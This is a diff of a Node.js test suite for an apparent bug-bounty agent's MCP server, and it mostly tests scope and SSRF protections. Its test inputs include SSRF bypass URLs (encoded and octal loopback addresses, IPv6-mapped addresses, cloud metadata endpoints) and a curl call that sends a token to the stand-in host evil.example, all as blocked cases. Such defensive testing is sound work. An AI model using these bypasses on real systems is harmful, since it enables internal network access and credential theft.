@@ -1,6 +1,12 @@
 const test = require("node:test");
 const assert = require("node:assert/strict");
+const { spawnSync } = require("child_process");
+const { EventEmitter } = require("events");
+const { Readable } = require("stream");
+const dns = require("dns");
 const fs = require("fs");
+const http = require("http");
+const https = require("https");
 const os = require("os");
 const path = require("path");
 const serverModule = require("../mcp/server.js");
@@ -22,8 +28,17 @@ const {
   appendHttpAuditRecord,
 } = require("../mcp/lib/http-records.js");
 const {
+  acquireSessionLock,
+  readSessionLockSnapshot,
+  removeStaleSessionLock,
   trimJsonlFile,
 } = require("../mcp/lib/storage.js");
+const {
+  safeFetch,
+} = require("../mcp/lib/safe-fetch.js");
+const {
+  normalizeAutoSignupResult,
+} = require("../mcp/lib/signup.js");
 
 const {
   TOOLS,
@@ -217,6 +232,81 @@ function seedFinding(domain, overrides = {}) {
     agent,
     ...overrides,
   }));
+}
+
+async function withMockSafeFetch(routes, fn, { dnsRecords = {} } = {}) {
+  const originalLookup = dns.lookup;
+  const originalHttpRequest = http.request;
+  const originalHttpsRequest = https.request;
+  const requestedUrls = [];
+
+  dns.lookup = (hostname, options, callback) => {
+    const cb = typeof options === "function" ? options : callback;
+    const records = dnsRecords[hostname] || [{ address: "93.184.216.34", family: 4 }];
+    if (Array.isArray(records)) {
+      cb(null, records);
+    } else {
+      cb(null, [records]);
+    }
+  };
+
+  const makeRequest = (requestOptions, callback) => {
+    const protocol = requestOptions.protocol || "https:";
+    const host = requestOptions.hostname;
+    const port = requestOptions.port ? `:${requestOptions.port}` : "";
+    const requestPath = requestOptions.path || "/";
+    const url = `${protocol}//${host}${port}${requestPath}`;
+    requestedUrls.push(url);
+
+    const req = new EventEmitter();
+    req.write = () => {};
+    req.setTimeout = () => req;
+    req.destroy = (error) => {
+      if (error) process.nextTick(() => req.emit("error", error));
+    };
+    req.end = () => {
+      const route = typeof routes === "function" ? routes(url, requestOptions) : routes[url];
+      process.nextTick(() => {
+        if (!route) {
+          req.emit("error", new Error(`No mock route for ${url}`));
+          return;
+        }
+        if (route.error) {
+          req.emit("error", route.error);
+          return;
+        }
+
+        const body = Buffer.isBuffer(route.body)
+          ? route.body
+          : Buffer.from(route.body == null ? "" : String(route.body));
+        const res = Readable.from([body]);
+        res.statusCode = route.status || 200;
+        res.statusMessage = route.statusText || "OK";
+        res.headers = route.headers || { "content-type": "text/plain" };
+        callback(res);
+      });
+    };
+    return req;
+  };
+
+  http.request = makeRequest;
+  https.request = makeRequest;
+
+  try {
+    return await fn(requestedUrls);
+  } finally {
+    dns.lookup = originalLookup;
+    http.request = originalHttpRequest;
+    https.request = originalHttpsRequest;
+  }
+}
+
+function runScopeGuard(command, { home, env = {} }) {
+  return spawnSync("bash", [path.join(__dirname, "..", ".claude", "hooks", "scope-guard.sh")], {
+    input: JSON.stringify({ tool_input: { command } }),
+    encoding: "utf8",
+    env: { ...process.env, HOME: home, ...env },
+  });
 }
 
 test("mcp server public exports remain stable", () => {
@@ -1721,7 +1811,13 @@ test("bounty_record_finding appends findings.jsonl and bounty_read_findings pres
     assert.equal(JSON.parse(jsonlLines[1]).id, "F-2");
 
     const readResult = JSON.parse(readFindings({ target_domain: domain }));
-    assert.deepEqual(readResult, {
+    assert.match(readResult.findings[0].dedupe_key, /^[a-f0-9]{24}$/);
+    assert.match(readResult.findings[1].dedupe_key, /^[a-f0-9]{24}$/);
+    const readResultWithoutDedupeKeys = {
+      ...readResult,
+      findings: readResult.findings.map(({ dedupe_key, ...finding }) => finding),
+    };
+    assert.deepEqual(readResultWithoutDedupeKeys, {
       version: 1,
       target_domain: domain,
       findings: [
@@ -1769,6 +1865,30 @@ test("bounty_record_finding still writes readable findings.md", () => {
     assert.match(markdown, /## FINDING 1 \(HIGH\): IDOR on account export/);
     assert.match(markdown, /\*\*ID:\*\* F-1/);
     assert.match(markdown, /curl https:\/\/example.com\/api\/export\?account_id=2/);
+  });
+});
+
+test("bounty_record_finding deduplicates exact findings unless force_record is set", () => {
+  withTempHome(() => {
+    const domain = "example.com";
+    const first = seedFinding(domain);
+    const duplicate = seedFinding(domain);
+
+    assert.equal(first.finding_id, "F-1");
+    assert.equal(duplicate.recorded, false);
+    assert.equal(duplicate.duplicate, true);
+    assert.equal(duplicate.finding_id, "F-1");
+    assert.equal(fs.readFileSync(findingsJsonlPath(domain), "utf8").trim().split("\n").length, 1);
+
+    const forced = seedFinding(domain, { force_record: true });
+    assert.equal(forced.recorded, true);
+    assert.equal(forced.finding_id, "F-2");
+    assert.equal(forced.force_record, true);
+
+    const records = fs.readFileSync(findingsJsonlPath(domain), "utf8").trim().split("\n").map((line) => JSON.parse(line));
+    assert.equal(records.length, 2);
+    assert.equal(records[1].force_record, true);
+    assert.equal(records[0].dedupe_key, records[1].dedupe_key);
   });
 });
 
@@ -2046,6 +2166,33 @@ test("bounty_write_verification_round rejects balanced/final rounds that drop pr
   });
 });
 
+test("bounty_write_verification_round requires valid prior round artifacts", () => {
+  withTempHome(() => {
+    const domain = "example.com";
+    seedFinding(domain);
+
+    assert.throws(() => writeVerificationRound({
+      target_domain: domain,
+      round: "balanced",
+      notes: null,
+      results: [],
+    }), /Missing brutalist verification round JSON/);
+
+    writeVerificationRound({
+      target_domain: domain,
+      round: "brutalist",
+      notes: null,
+      results: [],
+    });
+    assert.throws(() => writeVerificationRound({
+      target_domain: domain,
+      round: "final",
+      notes: null,
+      results: [],
+    }), /Missing balanced verification round JSON/);
+  });
+});
+
 test("bounty_read_verification_round hard-fails on missing or malformed JSON", () => {
   withTempHome(() => {
     const domain = "example.com";
@@ -2132,6 +2279,93 @@ test("bounty_write_grade_verdict writes grade.json and grade.md and accepts empt
       findings: [],
       feedback: null,
     });
+  });
+});
+
+test("bounty_write_grade_verdict enforces score totals, thresholds, and final reportability", () => {
+  withTempHome(() => {
+    const domain = "example.com";
+    seedFinding(domain, { severity: "high" });
+    const verified = [{
+      finding_id: "F-1",
+      disposition: "confirmed",
+      severity: "high",
+      reportable: true,
+      reasoning: "Confirmed.",
+    }];
+    for (const round of ["brutalist", "balanced", "final"]) {
+      writeVerificationRound({ target_domain: domain, round, notes: null, results: verified });
+    }
+
+    const gradeFinding = {
+      finding_id: "F-1",
+      impact: 20,
+      proof_quality: 10,
+      severity_accuracy: 5,
+      chain_potential: 5,
+      report_quality: 5,
+      total_score: 45,
+      feedback: null,
+    };
+
+    const valid = JSON.parse(writeGradeVerdict({
+      target_domain: domain,
+      verdict: "SUBMIT",
+      total_score: 45,
+      findings: [gradeFinding],
+      feedback: null,
+    }));
+    assert.equal(valid.verdict, "SUBMIT");
+
+    assert.throws(() => writeGradeVerdict({
+      target_domain: domain,
+      verdict: "SUBMIT",
+      total_score: 44,
+      findings: [gradeFinding],
+      feedback: null,
+    }), /total_score must equal the maximum per-finding score/);
+
+    assert.throws(() => writeGradeVerdict({
+      target_domain: domain,
+      verdict: "HOLD",
+      total_score: 45,
+      findings: [gradeFinding],
+      feedback: null,
+    }), /expected SUBMIT/);
+  });
+});
+
+test("bounty_write_grade_verdict rejects submit when final verification has no medium-or-higher reportable finding", () => {
+  withTempHome(() => {
+    const domain = "example.com";
+    seedFinding(domain, { severity: "high" });
+    const unreportable = [{
+      finding_id: "F-1",
+      disposition: "denied",
+      severity: null,
+      reportable: false,
+      reasoning: "Not reproducible.",
+    }];
+    for (const round of ["brutalist", "balanced", "final"]) {
+      writeVerificationRound({ target_domain: domain, round, notes: null, results: unreportable });
+    }
+
+    assert.throws(() => writeGradeVerdict({
+      target_domain: domain,
+      verdict: "SUBMIT",
+      total_score: 45,
+      findings: [{
+        finding_id: "F-1",
+        impact: 20,
+        proof_quality: 10,
+        severity_accuracy: 5,
+        chain_potential: 5,
+        report_quality: 5,
+        total_score: 45,
+        feedback: null,
+      }],
+      feedback: null,
+    }), /expected SKIP/);
   });
 });
 
@@ -2296,7 +2530,7 @@ test("bounty_auth_manual falls back to last session dir when target_domain is ab
   }
 });
 
-test("bounty_auth_manual falls back when target_domain session dir does not exist", async () => {
+test("bounty_auth_manual creates the target session auth path when target_domain session dir does not exist", async () => {
   const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-test-"));
   const previousHome = process.env.HOME;
   process.env.HOME = tempHome;
@@ -2311,7 +2545,8 @@ test("bounty_auth_manual falls back when target_domain session dir does not exis
     }));
 
     assert.equal(result.success, true);
-    assert.ok(fs.existsSync(path.join(sessionsDir, "zebra.com", "auth.json")));
+    assert.ok(fs.existsSync(path.join(sessionsDir, "nonexistent.com", "auth.json")));
+    assert.ok(!fs.existsSync(path.join(sessionsDir, "zebra.com", "auth.json")));
   } finally {
     process.env.HOME = previousHome;
     fs.rmSync(tempHome, { recursive: true, force: true });
@@ -2442,6 +2677,58 @@ test("bounty_auth_store stores credentials alongside headers", async () => {
     const saved = JSON.parse(fs.readFileSync(path.join(sessionsDir, "target.com", "auth.json"), "utf8"));
     assert.equal(saved.profiles.attacker.credentials.email, "test@mail.tm");
     assert.equal(saved.profiles.attacker.credentials.password, "secret123");
+  } finally {
+    process.env.HOME = previousHome;
+    fs.rmSync(tempHome, { recursive: true, force: true });
+  }
+});
+
+test("bounty_auth_store writes and migrates auth.json with 0600 permissions", async () => {
+  const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-test-"));
+  const previousHome = process.env.HOME;
+  process.env.HOME = tempHome;
+  try {
+    const targetDir = path.join(tempHome, "bounty-agent-sessions", "target.com");
+    const authPath = path.join(targetDir, "auth.json");
+    fs.mkdirSync(targetDir, { recursive: true });
+
+    await executeTool("bounty_auth_store", {
+      target_domain: "target.com",
+      role: "attacker",
+      cookies: { sessionid: "abc" },
+    });
+    assert.equal(fs.statSync(authPath).mode & 0o777, 0o600);
+
+    fs.writeFileSync(authPath, JSON.stringify({ Authorization: "Bearer legacy" }), { mode: 0o644 });
+    await executeTool("bounty_auth_store", {
+      target_domain: "target.com",
+      role: "victim",
+      headers: { Authorization: "Bearer victim" },
+    });
+    assert.equal(fs.statSync(authPath).mode & 0o777, 0o600);
+  } finally {
+    process.env.HOME = previousHome;
+    fs.rmSync(tempHome, { recursive: true, force: true });
+  }
+});
+
+test("bounty_auth_store reports persistence failures instead of claiming success", async () => {
+  const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-test-"));
+  const previousHome = process.env.HOME;
+  process.env.HOME = tempHome;
+  try {
+    const authPath = path.join(tempHome, "bounty-agent-sessions", "target.com", "auth.json");
+    fs.mkdirSync(authPath, { recursive: true });
+
+    const result = JSON.parse(await executeTool("bounty_auth_store", {
+      target_domain: "target.com",
+      role: "attacker",
+      headers: { "Authorization": "Bearer atok" },
+    }));
+
+    assert.equal(result.success, false);
+    assert.match(result.error, /failed to persist auth profile/i);
+    assert.equal(result.auth_path, authPath);
   } finally {
     process.env.HOME = previousHome;
     fs.rmSync(tempHome, { recursive: true, force: true });
@@ -2626,6 +2913,40 @@ test("bounty_temp_email poll for unknown email returns error", async () => {
   assert.ok(result.error.includes("Unknown email"));
 });
 
+test("auto-signup result normalization fails ambiguous states and preserves diagnostics", () => {
+  const signupUrl = "https://example.com/signup/";
+  const ambiguous = normalizeAutoSignupResult({
+    success: true,
+    submitted: true,
+    redirect_url: "https://example.com/signup#done",
+    page_errors: [],
+    filled_fields: { email: true, password: true },
+    cookies: { theme: "light" },
+    headers: {},
+    local_storage: {},
+    session_storage: {},
+  }, signupUrl);
+
+  assert.equal(ambiguous.success, false);
+  assert.equal(ambiguous.fallback, "manual");
+  assert.equal(ambiguous.diagnostics.submitted, true);
+  assert.deepEqual(ambiguous.auth_evidence.cookie_keys, []);
+
+  const successful = normalizeAutoSignupResult({
+    success: true,
+    submitted: true,
+    redirect_url: "https://example.com/dashboard",
+    page_errors: [],
+    filled_fields: { email: true, password: true },
+    cookies: { sessionid: "abc" },
+    headers: {},
+    local_storage: {},
+    session_storage: {},
+  }, signupUrl);
+  assert.equal(successful.success, true);
+  assert.deepEqual(successful.auth_evidence.cookie_keys, ["sessionid"]);
+});
+
 // ── migrateAuthJson unit tests ──
 
 test("migrateAuthJson wraps legacy flat object as attacker profile", () => {
@@ -2651,20 +2972,14 @@ test("migrateAuthJson handles null/undefined", () => {
 test("bounty_http_scan writes audit entries for success, HTTP error, timeout, and scope-blocked requests", async () => {
   await withTempHome(async () => {
     const domain = "example.com";
-    const previousFetch = global.fetch;
-    try {
-      global.fetch = async (url) => {
-        if (String(url).includes("/timeout")) {
-          const error = new Error("The operation was aborted");
-          error.name = "AbortError";
-          throw error;
-        }
-        if (String(url).includes("/forbidden")) {
-          return new Response("no", { status: 403, statusText: "Forbidden", headers: { "content-type": "text/plain" } });
-        }
-        return new Response("ok", { status: 200, statusText: "OK", headers: { "content-type": "text/plain" } });
-      };
+    const timeoutError = new Error("The operation was aborted");
+    timeoutError.name = "AbortError";
 
+    await withMockSafeFetch({
+      "https://example.com/ok": { status: 200, statusText: "OK", body: "ok" },
+      "https://example.com/forbidden": { status: 403, statusText: "Forbidden", body: "no" },
+      "https://example.com/timeout": { error: timeoutError },
+    }, async () => {
       assert.equal(JSON.parse(await executeTool("bounty_http_scan", {
         target_domain: domain,
         wave: "w1",
@@ -2705,23 +3020,20 @@ test("bounty_http_scan writes audit entries for success, HTTP error, timeout, an
       assert.equal(audit.summary.by_status_class["4xx"], 1);
       assert.equal(audit.summary.scope_blocked, 1);
       assert.ok(fs.existsSync(httpAuditJsonlPath(domain)));
-    } finally {
-      global.fetch = previousFetch;
-    }
+    });
   });
 });
 
 test("bounty_http_scan redacts persisted audit URLs while sending the original request", async () => {
   await withTempHome(async () => {
     const domain = "example.com";
-    const previousFetch = global.fetch;
-    const requestedUrls = [];
-    try {
-      global.fetch = async (url) => {
-        requestedUrls.push(String(url));
-        return new Response("ok", { status: 200, statusText: "OK", headers: { "content-type": "text/plain" } });
-      };
-
+    await withMockSafeFetch({
+      "https://example.com/callback?token=secret-token&code=oauth-code&id=123": {
+        status: 200,
+        statusText: "OK",
+        body: "ok",
+      },
+    }, async (requestedUrls) => {
       await executeTool("bounty_http_scan", {
         target_domain: domain,
         method: "GET",
@@ -2729,7 +3041,7 @@ test("bounty_http_scan redacts persisted audit URLs while sending the original r
         response_mode: "status_only",
       });
 
-      assert.equal(requestedUrls[0], "https://example.com/callback?token=secret-token&code=oauth-code&id=123#client-fragment");
+      assert.equal(requestedUrls[0], "https://example.com/callback?token=secret-token&code=oauth-code&id=123");
       const records = readHttpAuditRecordsFromJsonl(domain);
       assert.equal(records.length, 1);
       assert.equal(records[0].url, "https://example.com/callback?token=REDACTED&code=REDACTED&id=REDACTED");
@@ -2738,9 +3050,162 @@ test("bounty_http_scan redacts persisted audit URLs while sending the original r
 
       const audit = JSON.parse(readHttpAudit({ target_domain: domain }));
       assert.doesNotMatch(JSON.stringify(audit), /secret-token|oauth-code|client-fragment|id=123/);
-    } finally {
-      global.fetch = previousFetch;
-    }
+    });
+  });
+});
+
+test("bounty_http_scan blocks out-of-scope and deny-listed hosts while allowing target, attack-surface, and target-referenced public intel hosts", async () => {
+  await withTempHome(async () => {
+    const domain = "example.com";
+    seedAttackSurfaces(domain, [
+      { id: "surface-api", hosts: [`https://api.partner-service.com`] },
+    ]);
+    fs.writeFileSync(path.join(sessionDir(domain), "deny-list.txt"), "blocked.example.com\n");
+
+    await withMockSafeFetch({
+      "https://app.example.com/ok": { status: 200, statusText: "OK", body: "ok" },
+      "https://api.partner-service.com/v1/users": { status: 200, statusText: "OK", body: "ok" },
+      "https://crt.sh/?q=example.com": { status: 200, statusText: "OK", body: "ok" },
+    }, async (requestedUrls) => {
+      assert.equal(JSON.parse(await executeTool("bounty_http_scan", {
+        target_domain: domain,
+        method: "GET",
+        url: "https://app.example.com/ok",
+        response_mode: "status_only",
+      })).status, 200);
+      assert.equal(JSON.parse(await executeTool("bounty_http_scan", {
+        target_domain: domain,
+        method: "GET",
+        url: "https://api.partner-service.com/v1/users",
+        response_mode: "status_only",
+      })).status, 200);
+      assert.equal(JSON.parse(await executeTool("bounty_http_scan", {
+        target_domain: domain,
+        method: "GET",
+        url: "https://crt.sh/?q=example.com",
+        response_mode: "status_only",
+      })).status, 200);
+
+      const thirdParty = JSON.parse(await executeTool("bounty_http_scan", {
+        target_domain: domain,
+        method: "GET",
+        url: "https://third-party.example.net/api",
+      }));
+      assert.match(thirdParty.error, /out-of-scope host/);
+      assert.equal(thirdParty.scope_decision, "blocked");
+
+      const unrelatedIntel = JSON.parse(await executeTool("bounty_http_scan", {
+        target_domain: domain,
+        method: "GET",
+        url: "https://crt.sh/?q=other.com",
+      }));
+      assert.match(unrelatedIntel.error, /out-of-scope host/);
+      assert.equal(unrelatedIntel.scope_decision, "blocked");
+
+      const denied = JSON.parse(await executeTool("bounty_http_scan", {
+        target_domain: domain,
+        method: "GET",
+        url: "https://blocked.example.com/admin",
+      }));
+      assert.match(denied.error, /deny-listed host/);
+      assert.equal(denied.scope_decision, "blocked");
+
+      assert.deepEqual(requestedUrls, [
+        "https://app.example.com/ok",
+        "https://api.partner-service.com/v1/users",
+        "https://crt.sh/?q=example.com",
+      ]);
+
+      const records = readHttpAuditRecordsFromJsonl(domain);
+      assert.equal(records.length, 6);
+      assert.deepEqual(records.map((record) => record.scope_decision), [
+        "allowed",
+        "allowed",
+        "allowed",
+        "blocked",
+        "blocked",
+        "blocked",
+      ]);
+    });
+  });
+});
+
+test("bounty_http_scan requires target_domain instead of inferring scope from other sessions", async () => {
+  await withTempHome(async () => {
+    const domain = "example.com";
+    seedSessionState(domain);
+
+    const blocked = JSON.parse(await executeTool("bounty_http_scan", {
+      method: "GET",
+      url: "https://app.example.com/ok",
+      response_mode: "status_only",
+    }));
+    assert.match(blocked.error, /target_domain is required/);
+    assert.equal(blocked.scope_decision, "blocked");
+  });
+});
+
+test("bounty_http_scan blocks unsafe redirect targets before fetching them", async () => {
+  await withTempHome(async () => {
+    const domain = "example.com";
+    await withMockSafeFetch({
+      "https://example.com/redirect": {
+        status: 302,
+        statusText: "Found",
+        headers: { location: "http://127.0.0.1/admin" },
+      },
+    }, async (requestedUrls) => {
+      const result = JSON.parse(await executeTool("bounty_http_scan", {
+        target_domain: domain,
+        method: "GET",
+        url: "https://example.com/redirect",
+        follow_redirects: true,
+      }));
+
+      assert.match(result.error, /Blocked internal\/private host/);
+      assert.equal(result.scope_decision, "blocked");
+      assert.deepEqual(requestedUrls, ["https://example.com/redirect"]);
+
+      const records = readHttpAuditRecordsFromJsonl(domain);
+      assert.equal(records.length, 1);
+      assert.equal(records[0].scope_decision, "blocked");
+      assert.match(records[0].error, /Blocked internal\/private host/);
+    });
+  });
+});
+
+test("bounty_http_scan blocks public hostnames that resolve to private IPs before connecting", async () => {
+  await withTempHome(async () => {
+    const domain = "example.com";
+    await withMockSafeFetch({
+      "https://example.com/private-dns": { status: 200, body: "should not connect" },
+    }, async (requestedUrls) => {
+      const result = JSON.parse(await executeTool("bounty_http_scan", {
+        target_domain: domain,
+        method: "GET",
+        url: "https://example.com/private-dns",
+      }));
+      assert.match(result.error, /Blocked internal\/private DNS address/);
+      assert.equal(result.scope_decision, "blocked");
+      assert.deepEqual(requestedUrls, []);
+    }, { dnsRecords: { "example.com": [{ address: "10.0.0.5", family: 4 }] } });
+  });
+});
+
+test("safeFetch enforces response byte caps without buffering the full body", async () => {
+  await withTempHome(async () => {
+    const domain = "example.com";
+    await withMockSafeFetch({
+      "https://example.com/large": { status: 200, body: "abcdef" },
+    }, async () => {
+      const response = await safeFetch("https://example.com/large", {
+        targetDomain: domain,
+        maxResponseBytes: 4,
+      });
+      assert.equal(response.bodyTruncated, true);
+      assert.equal(response.bodyByteLength, 6);
+      assert.equal(await response.text(), "abcd");
+    });
   });
 });
 
@@ -3772,7 +4237,12 @@ test("auth storage rejects path traversal target domains", () => {
 
 test("validateScanUrl rejects localhost", () => {
   assert.throws(() => validateScanUrl("http://localhost/admin"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://%6c%6f%63%61%6c%68%6f%73%74/admin"), /Blocked internal/);
   assert.throws(() => validateScanUrl("http://127.0.0.1/admin"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://127.1/admin"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://0177.0.0.1/admin"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://2130706433/admin"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://0x7f000001/admin"), /Blocked internal/);
   assert.throws(() => validateScanUrl("http://0.0.0.0/"), /Blocked internal/);
 });
 
@@ -3782,8 +4252,19 @@ test("validateScanUrl rejects private IP ranges", () => {
   assert.throws(() => validateScanUrl("http://172.16.0.1/internal"), /Blocked internal/);
 });
 
+test("validateScanUrl rejects private, link-local, and IPv4-mapped IPv6 addresses", () => {
+  assert.throws(() => validateScanUrl("http://[::1]/admin"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://[fc00::1]/admin"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://[fd12:3456::1]/admin"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://[fe80::1]/admin"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://[::ffff:127.0.0.1]/admin"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://[::ffff:7f00:1]/admin"), /Blocked internal/);
+});
+
 test("validateScanUrl rejects cloud metadata endpoint", () => {
   assert.throws(() => validateScanUrl("http://169.254.169.254/latest/meta-data/"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://metadata.google.internal/computeMetadata/v1/"), /Blocked internal/);
+  assert.throws(() => validateScanUrl("http://metadata/latest/meta-data/"), /Blocked internal/);
 });
 
 test("validateScanUrl rejects unsupported protocols", () => {
@@ -3805,28 +4286,115 @@ test("validateScanUrl rejects malformed URLs", () => {
   assert.throws(() => validateScanUrl("not-a-url"), /Invalid URL/);
 });
 
-// ── Bug 5: Session lock uses marker for ownership verification ──
+test("scope guard blocks out-of-scope Bash network commands by default and redacts query values", () => {
+  withTempHome((tempHome) => {
+    const domain = "example.com";
+    seedSessionState(domain);
 
-test("session lock creates marker file inside lock directory", () => {
+    const blocked = runScopeGuard('curl "https://evil.example/path?token=supersecret"', { home: tempHome });
+    assert.equal(blocked.status, 2);
+    assert.match(blocked.stderr, /evil\.example/);
+    assert.match(blocked.stderr, /example\.com/);
+    assert.doesNotMatch(blocked.stderr, /supersecret/);
+
+    const logContent = fs.readFileSync(path.join(sessionDir(domain), "scope-warnings.log"), "utf8");
+    assert.match(logContent, /OUT-OF-SCOPE: evil\.example/);
+    assert.match(logContent, /\?REDACTED/);
+    assert.doesNotMatch(logContent, /supersecret/);
+
+    const logOnly = runScopeGuard('curl "https://other.example.net/path?token=still-secret"', {
+      home: tempHome,
+      env: { BOUNTY_SCOPE_LOG_ONLY: "1" },
+    });
+    assert.equal(logOnly.status, 0);
+
+    const allowed = runScopeGuard("curl https://app.example.com/ok", { home: tempHome });
+    assert.equal(allowed.status, 0);
+  });
+});
+
+test("scope guard deny-list blocks even when out-of-scope log-only mode is set", () => {
+  withTempHome((tempHome) => {
+    const domain = "example.com";
+    seedSessionState(domain);
+    fs.writeFileSync(path.join(sessionDir(domain), "deny-list.txt"), "blocked.example.com\n");
+
+    const denied = runScopeGuard("curl https://blocked.example.com/admin", {
+      home: tempHome,
+      env: { BOUNTY_SCOPE_LOG_ONLY: "1" },
+    });
+    assert.equal(denied.status, 2);
+    assert.match(denied.stderr, /deny list/);
+  });
+});
+
+// ── Bug 5: Session lock uses owner metadata for ownership verification ──
+
+test("session lock creates an atomic metadata lock file", () => {
   withTempHome(() => {
     const domain = "locktest.com";
     const dir = sessionDir(domain);
     fs.mkdirSync(dir, { recursive: true });
 
+    const release = acquireSessionLock(domain);
+    try {
+      const lockPath = sessionLockPath(domain);
+      assert.ok(fs.statSync(lockPath).isFile());
+      const metadata = JSON.parse(fs.readFileSync(lockPath, "utf8"));
+      assert.equal(metadata.pid, process.pid);
+      assert.ok(metadata.hostname);
+      assert.ok(metadata.timestamp);
+      assert.ok(metadata.token);
+    } finally {
+      release();
+    }
+    assert.ok(!fs.existsSync(sessionLockPath(domain)));
+  });
+});
+
+test("session lock stale override uses JSON timestamp and does not remove replacement locks", () => {
+  withTempHome(() => {
+    const domain = "locktest.com";
     const lockPath = sessionLockPath(domain);
+    fs.mkdirSync(sessionDir(domain), { recursive: true });
 
-    // Acquire lock manually
-    fs.mkdirSync(lockPath);
-    const markerPath = path.join(lockPath, `owner-${process.pid}-${Date.now()}`);
-    fs.writeFileSync(markerPath, "");
+    fs.writeFileSync(lockPath, `${JSON.stringify({
+      pid: 1,
+      hostname: "old-host",
+      timestamp: new Date(Date.now() - SESSION_LOCK_STALE_MS - 1_000).toISOString(),
+      token: "old",
+    })}\n`);
+    const freshDate = new Date();
+    fs.utimesSync(lockPath, freshDate, freshDate);
 
-    // Verify marker exists inside lock dir
-    const contents = fs.readdirSync(lockPath);
-    assert.ok(contents.length > 0, "Lock directory should contain a marker file");
-    assert.ok(contents[0].startsWith("owner-"), "Marker file should start with 'owner-'");
+    const release = acquireSessionLock(domain);
+    try {
+      const metadata = JSON.parse(fs.readFileSync(lockPath, "utf8"));
+      assert.equal(metadata.pid, process.pid);
+      assert.notEqual(metadata.token, "old");
+    } finally {
+      release();
+    }
 
-    // Cleanup
-    fs.rmSync(lockPath, { recursive: true, force: true });
+    fs.writeFileSync(lockPath, `${JSON.stringify({
+      pid: 1,
+      hostname: "old-host",
+      timestamp: new Date(Date.now() - SESSION_LOCK_STALE_MS - 1_000).toISOString(),
+      token: "stale",
+    })}\n`);
+    const snapshot = readSessionLockSnapshot(lockPath);
+    assert.equal(snapshot.isStale, true);
+
+    fs.rmSync(lockPath, { force: true });
+    fs.writeFileSync(lockPath, `${JSON.stringify({
+      pid: process.pid,
+      hostname: "new-host",
+      timestamp: new Date().toISOString(),
+      token: "replacement",
+    })}\n`);
+
+    assert.equal(removeStaleSessionLock(lockPath, snapshot), false);
+    assert.equal(JSON.parse(fs.readFileSync(lockPath, "utf8")).token, "replacement");
   });
 });
 
@@ -3932,6 +4500,7 @@ test("httpScan returns error when auth_profile is requested but not found", asyn
   process.env.HOME = tempHome;
   try {
     const result = JSON.parse(await executeTool("bounty_http_scan", {
+      target_domain: "example.com",
       method: "GET",
       url: "https://example.com/",
       auth_profile: "nonexistent_test_profile_xyz",
